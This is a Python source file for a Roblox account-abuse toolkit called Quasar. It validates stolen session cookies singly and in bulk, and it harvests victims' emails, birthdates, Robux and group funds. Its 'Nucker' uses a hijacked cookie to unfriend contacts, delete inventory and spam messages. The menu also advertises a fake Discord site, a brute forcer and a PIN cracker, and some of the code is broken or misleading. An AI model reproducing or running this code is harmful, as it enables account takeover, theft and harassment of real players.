# made by 0x256 
# 2.0.0 (without bypassing)
# outdated
# TODO: create new bypass server

import subprocess



try:
    from pyisemail import is_email
    from pystyle import Colorate, Colors, Add, Center, Write, Anime, Box
    import requests
    import threading
    from queue import Queue
    from tqdm import tqdm
    import sys
    import time
    import os
    import subprocess
    from termcolor import cprint
    import random
    import socket
    import glob
    from rich.console import Console
except:
    try:
        import pip
    except ImportError:
        os.system("")
        print("[", end="")
        print("] ", end="")
        print("\033[31m" + "[ERROR] Pip not installed. Installing now...")
        subprocess.call(
            "curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py", shell=True
        )
        time.sleep(5)
        os.system("get-pip.py")
    print("[", end="")
    print("] ", end="")
    print("\033[31m" + "[ERROR] Packages not installed. Installing now...")
    subprocess.call("pip install termcolor", shell=True)
    subprocess.call("pip install requests", shell=True)
    subprocess.call("pip install pystyle", shell=True)
    subprocess.call("pip install os", shell=True)
    subprocess.call("pip install time", shell=True)
    subprocess.call("pip install random", shell=True)
    subprocess.call("pip install pyisemail", shell=True)
    subprocess.call("pip install socket", shell = True)
    subprocess.call("pip install Console", shell = True)
    subprocess.call("pip install glob", shell = True)
    subprocess.call("pip install queue", shell = True)
finally:
    from pyisemail import is_email
    from pystyle import Colorate, Colors, Add, Center, Write, Anime, Box
    import requests
    import socket
    import threading
    import glob
    import time
    from tqdm import tqdm
    import os
    import sys
    import subprocess
    from termcolor import cprint
    from queue import Queue
    import random
    from rich.console import Console

#########################################################################################################################################
#########################################################################################################################################
#########################################################################################################################################
#########################################################################################################################################


def getBanner():
	bannerText = """

"""
	
	bannerLogo = """
         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
         ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
         ░▒▓█▓▒░                                                                      
            ░▒▓██▓▒░             

"""

	banner = Colorate.Vertical(Colors.purple_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
	return banner

def getChecker():
	bannerText = """

"""
	
	bannerLogo = """
         ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░░▒▓██████▓▒░░▒▓████████▓▒░▒▓███████▓▒░  
        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
        ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
         ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
         ░▒▓█▓▒░                                                                      
          ░▒▓██▓▒░                                                                    
                                                                                                 
"""

	banner = Colorate.Vertical(Colors.purple_to_blue, Center.Center(Add.Add(bannerLogo, bannerText, 0)), 1)
	return banner

if os.name == "nt":
    os.system("cls")
else:
    os.system("clear")
print('')
Write.Print("[WARNING] You are not using the full version of v1. 10 functions are not available in it. The full version will be available after the new year.\n", Colors.orange, interval=0.0025)
print(getBanner())
import requests
import re
import string
import time
import os
from pystyle import Colorate, Colors, Add, Center, Write


year = time.localtime().tm_year
day = time.localtime().tm_mday
month = time.localtime().tm_mon


def download_file(url, filepath):
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()
        total_size = int(response.headers.get('content-length', 0))
        with open(filepath, 'wb') as file, tqdm(
            total=total_size, unit='B', unit_scale=True, desc=f"Downloading {os.path.basename(filepath)}"
        ) as progress_bar:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
                progress_bar.update(len(chunk))
    except Exception as e:
        print(f"Error while loading {os.path.basename(filepath)}: {e}")




def check_version(version):
    Write.Print(f"Checking for updates...\n", Colors.orange, interval=0.0025)
    try:
        response = requests.get("https://raw.githubusercontent.com/QuasarRBX/Quasar/refs/heads/main/version")
        latest_version = response.text.strip()
        if latest_version != version:
            Write.Print(f"New version available. Downloading {latest_version} from the Github!\n", Colors.red, interval=0.0025)
            current_dir = os.path.dirname(sys.executable if getattr(sys, 'frozen', False) else __file__)
            url = f"https://github.com/QuasarRBX/Quasar/releases/download/{latest_version}/Quasar.exe"
            download_file(url, os.path.join(current_dir, "Quasar.exe"))
            os.system("pause")
        else:
            Write.Print(f"Newest version!\n", Colors.green, interval=0.0025)
            time.sleep(2)
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print('')
            print(getBanner())
            GetNumber()


            

    except requests.exceptions.RequestException:
        pass
    except:
        pass

version = "2.0.0" #outdated

def masscheck():
    cookiefilefolder = os.path.dirname(__file__)
    cookiefile = (cookiefilefolder + "\cookies.txt")
    cookie = open(cookiefile).read().splitlines()
    
    validcount = 0
    invalidcount = 0
    i = 0
    if len(cookie) > 0:
        print(str(len(cookie)) + " Cookie(s) Found")
        print(" ")
        pathnameforvalid = os.path.join(os.path.dirname(__file__), "validcookies.txt")
        newfileforvalid = open(pathnameforvalid, "w")
        newfileforvalid.truncate(0)
        pathnameforinvalid = os.path.join(os.path.dirname(__file__), "invalidcookies.txt")
        newfileforinvalid = open(pathnameforinvalid, "w")
        newfileforinvalid.truncate(0)
        for line in cookie:
            check = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': str(line)})
            if check.status_code == 200:
                newfileforvalid.write("[VALID]: " + str(line) + "\n")
                validcount += 1
                i+=1
                Write.Print(f"[VALID]: {line}\n", Colors.purple_to_blue, interval=0.0025)
            else:
                newfileforinvalid.write("[INVALID]: " + str(line) + "\n")
                invalidcount += 1
                i+=1
                Write.Print(f"[INVALID]: {i}\n", Colors.red, interval=0.0025)
        print("Valid Cookie(s): " + str(validcount) + "\nInvalid Cookie(s):" + str(invalidcount))
    else:
        print("No cookies found.")
    Write.Input("Press any key to exit: ", Colors.orange, interval=0.0025)
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print(getBanner())
    GetNumber()

def RobloxIp():
    username = os.getenv('username')
    Write.Print("""
    How to use:
    Join a Roblox game and wait until the game fully loads
    Run this script while in the game
    Press enter when you are ready to pull the IP!\n\n""", Colors.purple_to_blue, interval=0.0025)
    try:
        Write.Input("Press [ENTER] to grab the IP!", Colors.purple_to_blue, interval=0.0025)
    except SyntaxError:
        pass
    list_of_files = glob.glob(r'C:\users\{}\AppData\Local\Roblox\logs\*'.format(username))
    latest_file = max(list_of_files, key=os.path.getctime)
    roblox_log = open(latest_file, 'r')

    for line in roblox_log:
        if 'Connection accepted from' in line:
            
            line = line.replace('Connection accepted from', '')
            line2 = line.replace('|', ':')
            line3 = line2[25:]
            Write.Print(f"Server IP: {line3}\n", Colors.purple_to_blue, interval=0.0025)


            ip_history = open('server_ips.txt', 'a+')
            ip_history.write(line3 + "\n")
            ip_history.close()
            os.system("pause")
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")

def BuyAll():
    cookie = Write.Input(f"Cookie to free-item-buyer: ", Colors.purple_to_blue, interval=0.0025)
    session = requests.Session()
    session.cookies.update({".ROBLOSECURITY": cookie})

    console = Console(highlight=False)


    def cprint(color: str, content: str) -> None:
        console.print(f"[ [bold {color}]>[/] ] {content}")


    def fetch_items() -> None:
        result = {}
        cursor = ""

        while cursor is not None:
            req = session.get(
                f"https://catalog.roblox.com/v1/search/items/details?category=All&creatorTargetId=1&limit=30&maxPrice=0&cursor={cursor}"
            )
            res = req.json()

            if req.status_code == 429:
                cprint("red", "Rate limited. Waiting 20 seconds")
                time.sleep(20)
                continue

            for item in res.get("data", []):
                item_name = item.get("name")
                result[item_name] = item.get("productId")
                cprint("blue", f"Found {item_name}")

            cursor = res.get("nextPageCursor")

        return result


    def purchase(name: str, product_id: int) -> None:
        req = session.post("https://auth.roblox.com/v2/login")
        csrf_token = req.headers["x-csrf-token"]

        while True:
            req = session.post(
                f"https://economy.roblox.com/v1/purchases/products/{product_id}",
                json={"expectedCurrency": 1, "expectedPrice": 0, "expectedSellerId": 1},
                headers={"X-CSRF-TOKEN": csrf_token},
            )

            if req.status_code == 429:
                cprint("red", "Rate limited. Waiting 60 seconds")
                time.sleep(60)
                continue

            res = req.json()
            if "reason" in res and res.get("reason") == "AlreadyOwned":
                cprint("yellow", f"{name} is already owned")
                return

            cprint("green", f"Successfully purchased {name}")
            return


    def main() -> None:
        free_items = fetch_items()
        for name, product_id in free_items.items():
            purchase(name, product_id)


    main()

# Disconected cuz roblox deleted pins

def Pin_Cracker():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print(getBanner())
    GetNumber()
    

def Nucker():
    def getXsrf(cookie):
        xsrfRequest = requests.post(
            "https://auth.roblox.com/v2/logout", cookies={".ROBLOSECURITY": cookie}
        )
        return xsrfRequest.headers["x-csrf-token"]


    def clear():
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")


    class Nuke:
        def __init__(self):
            self.headers = None
            self.cookie = None
            self.start()

        def flash(self):
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Flashing....", "magenta")
            print("[", end="")
            cprint(" NUKER ", "yellow", end="")
            print("] ", end="")
            cprint("Press Ctrl + C to stop", "yellow")
            try:
                while True:
                    requests.patch(
                        "https://accountsettings.roblox.com/v1/themes/user",
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                        data={"themeType": "Light"},
                    )
                    requests.patch(
                        "https://accountsettings.roblox.com/v1/themes/user",
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                        data={"themeType": "Dark"},
                    )
            except KeyboardInterrupt:
                print("[", end="")
                cprint(" NUKER ", "magenta", end="")
                print("] ", end="")
                for i in "Done Nuking...":
                    time.sleep(0.1)
                    cprint(i, "magenta", end="", flush=True)

        def changeLanguage(self):
            while True:
                requests.post(
                    "https://locale.roblox.com/v1/locales/set-user-supported-locale",
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                    data={"supportedLocaleCode": "ja_jp"},
                )
                requests.post(
                    "https://locale.roblox.com/v1/locales/set-user-supported-locale",
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                    data={"supportedLocaleCode": "ko_kr"},
                )

        def messageAll(self, message):
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Messaging friends....", "magenta")
            conversations = requests.get(
                "https://chat.roblox.com/v2/get-user-conversations?pageNumber=1&pageSize=3000",
                cookies={".ROBLOSECURITY": str(self.cookie)},
                headers=self.headers,
            ).json()
            for conversation in conversations:
                requests.post(
                    "https://chat.roblox.com/v2/send-message",
                    data={"conversationId": conversation["id"], "message": message},
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                )
                print("[", end="")
                cprint(" NUKER ", "magenta", end="")
                print("] ", end="")
                cprint(f"Sent message to {conversation['id']}", "magenta")

        def removeItems(self):
            items = requests.get(
                f"https://www.roblox.com/users/inventory/list-json?assetTypeId=2&cursor=&itemsPerPage=1000000000&pageNumber=1&userId={self.userid}",
                cookies={".ROBLOSECURITY": str(self.cookie)},
                headers=self.headers,
            ).json()["Data"]["Items"]
            for item in items:
                time.sleep(4)
                id = item["Item"]["AssetId"]
                response = requests.post(
                    "https://www.roblox.com/asset/delete-from-inventory",
                    data={"assetId": str(id)},
                    cookies={".ROBLOSECURITY": str(self.cookie)},
                    headers=self.headers,
                )
                if response.status_code == 429:
                    time.sleep(10)
                    response = requests.post(
                        "https://www.roblox.com/asset/delete-from-inventory",
                        data={"assetId": id},
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                    )
                    print("[", end="")
                    cprint(" NUKER ", "magenta", end="")
                    print("] ", end="")
                    cprint(f"Removed {id} from user's inventory", "magenta")
                else:
                    print("[", end="")
                    cprint(" NUKER ", "magenta", end="")
                    print("] ", end="")
                    cprint(f"Removed {id} from user's inventory", "magenta")
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Removed all items from user's inventory", "magenta")
            time.sleep(1)

        def unfriend(self):
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Unfriending friends....", "magenta")
            friends = requests.get(
                f"https://friends.roblox.com/v1/users/{self.userid}/friends",
                cookies={".ROBLOSECURITY": str(self.cookie)},
            ).json()["data"]
            friendIds = [friend["id"] for friend in friends]
            for i in friendIds:
                time.sleep(0.1)
                print(
                    requests.post(
                        f"https://friends.roblox.com/v1/users/{i}/unfriend",
                        cookies={".ROBLOSECURITY": str(self.cookie)},
                        headers=self.headers,
                    ).text
                )
                print("[", end="")
                cprint(" NUKER ", "magenta", end="")
                print("] ", end="")
                cprint(f"Unfriended {i}!", "magenta")
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Unfriended All!", "magenta")

        def check(self):
            print("[", end="")
            cprint("NUKER", "magenta", end="")
            print("] ", end="")
            cprint("Enter Your Cookie Below:", "magenta")
            self.cookie = input("> ")
            print("[", end="")
            cprint(" NUKER ", "magenta", end="")
            print("] ", end="")
            cprint("Enter Your mass dm message below:", "magenta")
            self.message = input("> ")
            return requests.get(
                "https://chat.roblox.com/v2/get-unread-conversation-count",
                cookies={".ROBLOSECURITY": str(self.cookie)},
            )

        def start(self):
            os.system("")
            check = self.check()
            if check.status_code == 200:
                self.headers = {"X-CSRF-TOKEN": getXsrf(self.cookie)}
                userdata = requests.get(
                    "https://users.roblox.com/v1/users/authenticated",
                    cookies={".ROBLOSECURITY": self.cookie},
                ).json()  # get user data
                self.userid = userdata["id"]  # user id
                clear()
                threading.Thread(target=self.flash).start()
                threading.Thread(target=self.unfriend).start()
                threading.Thread(target=self.changeLanguage).start()
                threading.Thread(target=self.removeItems).start()
                threading.Thread(target=self.messageAll, args=(self.message,)).start()
                Write.Input("Press any key to exit", Colors.orange, interval=0.0025)
                os.system("cls")
                print('')
                print(getBanner())
                GetNumber()
            else:
                print(check.status_code)
                print("[", end="")
                cprint(" ERROR ", "red", end="")
                print("] ", end="")
                cprint("Invalid Cookie", "red")
                time.sleep(1.4)
                clear()
                print(getBanner())
                self.check()
    Nuke()
    Write.Input("[UNKNOW ERROR] Press any key to exit", Colors.red, interval=0.0025)
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print(getBanner())
    GetNumber()


def CookieGenerator():

    outputfile = open("Gen_cookies.txt")

    x = 0
    cookies = []
    intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    n = 0
    c = int(Write.Input("How many cookie you want to generate?: ", Colors.purple_to_blue, interval=0.0025))
    Write.Print("Generating random cookies... please be patient! \n", Colors.red, interval=0.0025)

    letters = 'ABCDEF'

    while x < c:


        cookies =  intro +  ''.join(random.choices(letters + string.digits, k=1640))

        x = x + 1
        
        f = open(outputfile)
        f.write(f'{cookies}\n')
        f.close()

    outputfile.close()

    Write.Print("Done! IF any valid cookies were found, they have been added to the hits.txt file! \n", Colors.purple_to_blue, interval=0.0025)
    Write.Input("Press any key to exit", Colors.red, interval=0.0025)
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print(getBanner())
    GetNumber()

def check(cookie):

  Emmail = requests.get('https://accountsettings.roblox.com/v1/email', cookies={'.ROBLOSECURITY': str(cookie)}).json()
  email = Emmail['verified']
  EmailName = Emmail['emailAddress']
  Write.Print(f"[Process] Get email...\n", Colors.orange, interval=0.0025)
  credit = requests.get("https://billing.roblox.com/v1/credit", cookies={'.ROBLOSECURITY': str(cookie)}).json()['balance']
  Write.Print(f"[Process] Get credit...\n", Colors.orange, interval=0.0025)
  userdata = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json() #get user data
  birthday = requests.get("https://accountinformation.roblox.com/v1/birthdate", cookies={'.ROBLOSECURITY': str(cookie)}).json()
  Write.Print(f"[Process] Get birthday...\n", Colors.orange, interval=0.0025)
  userid = userdata['id'] #user id
  followers = requests.get(f"https://friends.roblox.com/v1/users/{userid}/followers/count", cookies={'.ROBLOSECURITY': str(cookie)}).json()['count']
  Write.Print(f"[Process] Get followers...\n", Colors.orange, interval=0.0025)
  Write.Print(f"[Process] Get userId...\n", Colors.orange, interval=0.0025)

  transactions = requests.get(f"https://economy.roblox.com/v2/users/{userid}/transaction-totals?timeFrame=Month&transactionType=summary", cookies={'.ROBLOSECURITY': str(cookie)}, data={'timeFrame':'Month', 'transactionType': 'summary'}).json()
  pending = transactions['pendingRobuxTotal']
  Write.Print(f"[Process] Get Pending...\n", Colors.orange, interval=0.0025)
  stipends = transactions['premiumStipendsTotal']
  Write.Print(f"[Process] Get stipends...\n", Colors.orange, interval=0.0025)
  devEx = transactions['developerExchangeTotal']
  Write.Print(f"[Process] Get DevEX...\n", Colors.orange, interval=0.0025)
  groups = requests.get(f"https://groups.roblox.com/v1/users/{userid}/groups/roles", cookies={'.ROBLOSECURITY': str(cookie)})
  groupIds = [i['group']['id'] for i in groups.json()['data'] if i['group']['owner']['userId'] == userid]
  groupFunds = 0
  for i in groupIds:
    groupFunds += int(requests.get(f"https://economy.roblox.com/v1/groups/{i}/currency", cookies={'.ROBLOSECURITY': str(cookie)}).json()['robux'])
  creationDate = requests.get(f'https://users.roblox.com/v1/users/{userid}').json()['created']
  display = userdata['displayName'] #display name
  Write.Print(f"[Process] Get Display...\n", Colors.orange, interval=0.0025)
  username = userdata['name'] #username
  Write.Print(f"[Process] Get Username...\n", Colors.orange, interval=0.0025)
  robuxdata = requests.get(f'https://economy.roblox.com/v1/users/{userid}/currency',cookies={".ROBLOSECURITY":cookie}).json() 
  robux = robuxdata['robux'] #get robux balance
  Write.Print(f"[Process] Get Robux...\n", Colors.orange, interval=0.0025)
  #does the user have premium?
  premiumbool = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{userid}/validate-membership', cookies={".ROBLOSECURITY":cookie}).json()
  #get rap
  rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
  while rap_dict['nextPageCursor'] != None:
      rap_dict = requests.get(f'https://inventory.roblox.com/v1/users/{userid}/assets/collectibles?assetType=All&sortOrder=Asc&limit=100',cookies={".ROBLOSECURITY":cookie}).json()
  rap = sum(i['recentAveragePrice'] for i in rap_dict['data'])
  birthdate = f'{birthday["birthMonth"]}/{birthday["birthDay"]}/{birthday["birthYear"]}'
  thumbnail=requests.get(f"https://thumbnails.roblox.com/v1/users/avatar?userIds={userid}&size=420x420&format=Png&isCircular=false").json()
  image_url = thumbnail["data"][0]["imageUrl"]
  pindata = requests.get('https://auth.roblox.com/v1/account/pin',cookies={".ROBLOSECURITY":cookie}).json() 
  pin_bool = pindata["isEnabled"] #does the user have a pin
  Write.Print(f"Username: {username}, url= https://roblox.com/users/{userid}\n", Colors.purple_to_blue, interval=0.0025)
  file = f"{username}_cookie.txt"
  with open(file, 'a+') as f:
   f.write(f"Username: {username} | ")
  Write.Print(f"Display name: {display}\n", Colors.purple_to_blue, interval=0.0025)
  Write.Print(f"User ID: {userid}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"UserID: {userid} | ")
  Write.Print(f"Robux: {robux}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Robux: {robux} | ")
  Write.Print(f"Has pin: {pin_bool}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Has pin: {pin_bool} | ")
  if pin_bool == True:
    Write.Print(f"[advice]: Use Jupiter pin cracker!\n", Colors.orange, interval=0.0025)
  Write.Print(f"Premium: {premiumbool}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Premium: {premiumbool} | ")
  Write.Print(f"Credit: {credit}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Credit: {credit} | ")
  Write.Print(f"Birthday: {birthdate}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"birthday: {birthdate} | ")
  Write.Print(f"Groups: {groupIds}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Groups: {groupIds} | ")
  Write.Print(f"Rap: {rap}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Rap: {rap} | ")
  Write.Print(f"Is email verified: {email}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Email verified: {email} | ")
  Write.Print(f"Email: {EmailName}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Email name: {EmailName} | ")
  Write.Print(f"group founds: {groupFunds}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Group founds: {groupFunds} | ")
  Write.Print(f"Dev exchange: {devEx}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"DEVx exchange: {devEx} | ")
  with open(file, 'a+') as f:
   f.write(f"followers: {followers} | ")
  Write.Print(f"Pending: {pending}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Pending: {pending} | ")
  Write.Print(f"Premium Stipends: {stipends}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Premium Stipends: {stipends} | ")
  Write.Print(f"Followers: {followers}\n", Colors.purple_to_blue, interval=0.0025)
  with open(file, 'a+') as f:
   f.write(f"Display name: {display} | ")
  with open(file, 'a+') as f:
   f.write(f"Cookie: {cookie} | ")
  with open(file, 'a+') as f:
   f.write(f"Quasar cookie checker by 0x256. Saved on: {day}.{month}.{year}")
  cookie = Write.Input(f"Press any key to exit", Colors.orange, interval=0.0025)

  Write.Input("Press any key to exit", Colors.orange, interval=0.0025)
  if os.name == "nt":
    os.system("cls")
  else:
    os.system("clear")
  print('')
  print(getBanner())
  GetNumber()


def GruupFind():
    def groupfinder(suma):
        try:
            id = random.randint(1000000, 1150000)
            r = requests.get(f"https://www.roblox.com/groups/group.aspx?gid={id}", timeout=30)
            if 'owned' not in r.text:
                re = requests.get(f"https://groups.roblox.com/v1/groups/{id}", timeout=30)
                if re.status_code != 429:
                    if 'errors' not in re.json():
                        if 'isLocked' not in re.text and 'owner' in re.text:
                            if re.json()['publicEntryAllowed'] == True and re.json()['owner'] == None:
                                Write.Print(f"[+] Hit: {id}\n", Colors.purple_to_blue, interval=0.0025)
                                suma+=1
                            else:
                                Write.Print(f"[-] No Entry: {id}\n", Colors.purple_to_blue, interval=0.0025)
                        else:
                            Write.Print(f"[-] Group Locked: {id}\n", Colors.purple_to_blue, interval=0.0025)
                else:
                    Write.Print(f"[-] Group API Rate Limited\n", Colors.purple_to_blue, interval=0.0025)
            else:
                Write.Print(f"[-] Group Already Owned: {id}\n", Colors.purple_to_blue, interval=0.0025)
        except:
            pass
            return suma

    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

    print('')


    print(getBanner())

    inputa =  Write.Input("[-] How many repeats: ", Colors.purple_to_blue, interval=0.0025)
    threads = int(inputa)
    suma = 0
    while threads!=0:
        groupfinder(suma)
        threads = threads-1

    Write.Input(f"Sum of the resulting groups: {suma}. Press any key to exit", Colors.orange, interval=0.0025)
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    print(getBanner())
    GetNumber()

def GetNumber():
    Printing = Colorate.Vertical(Colors.purple_to_blue, Center.XCenter("""
[1] Cheats;                           [6] Email validator;                   [11] Get sever IP;                 
[2] Cookie checker;                   [7] Nucker;                            [12] Follower Bot;                 
[3] Discord fake site;                [8] BruteForcer;                       [13] Mass-cookie-check;            
[4] Roblox Pin cracker;               [9] free-item-buyer;                   [14] Mass report;                  
[5] Group finder                      [10] Cookie Generator;                 [15] Group wall spammer;           """), 1)  
    print(Printing)
    Number = Write.Input("Enter number: ", Colors.purple_to_blue, interval=0.0025)

    if Number == "2":
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        a = 0
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getChecker())
        cookie = Write.Input(f"Cookie to check: ", Colors.purple_to_blue, interval=0.0025)
       
        check(cookie)
    elif Number == "3":
        Write.Print("Our servers off, please wait\n", Colors.purple_to_blue, interval=0.0025)
        a = 0
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        GetNumber()
    elif Number == "4":
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        Pin_Cracker()
    elif Number == "5":
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        GruupFind()
    elif Number == "7":
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        Nucker()
    elif Number == "9":
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        BuyAll()
    elif Number == "10":
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        CookieGenerator()
    elif Number == "11":
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        RobloxIp()
    elif Number == "13":
        Write.Print("Starting... \n", Colors.purple_to_blue, interval=0.0025)
        time.sleep(2)
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")
        print('')
        print(getBanner())
        masscheck()
    
    else:
        Write.Print("Invalid Number!\n", Colors.purple_to_blue, interval=0.0025)

check_version(version)

